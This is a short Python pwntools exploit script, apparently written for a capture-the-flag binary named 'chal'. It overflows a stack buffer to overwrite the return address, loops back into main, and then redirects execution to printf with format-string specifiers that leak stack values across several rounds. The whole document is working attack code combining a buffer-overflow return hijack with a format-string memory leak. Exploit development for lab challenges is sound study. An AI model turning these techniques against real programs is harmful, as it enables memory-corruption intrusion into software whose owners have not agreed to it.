from pwn import *
context.arch='amd64'; context.log_level='error'
e=ELF("./chal")
PRINTF=e.plt['printf']; MAIN=e.symbols['main']
def build(fmt, ret):
    body=(b"exit"+fmt).ljust(0x58,b"A")
    assert b"\x00" not in body
    return body+p64(ret)

p=process("./chal")
def rnd(payload):
    p.recvuntil(b">> ", timeout=3)
    p.send(payload)
# prime
for i in range(3):
    rnd(build(b"", MAIN))
# now repeated printf rounds
for i in range(6):
    rnd(build(b"P%d:%%6$p:%%7$p:%%8$p:%%9$p:%%12$p:%%13$p:%%14$p:%%15$p:%%16$p:%%17$p:%%18$p:"%i, PRINTF))
    import time; time.sleep(0.2)
    try:
        d=p.recv(timeout=2)
        print("round",i,"looped=",b">> " in d, repr(d[:230]))
    except Exception as ex:
        print("round",i,"DEAD",ex); break
p.close()
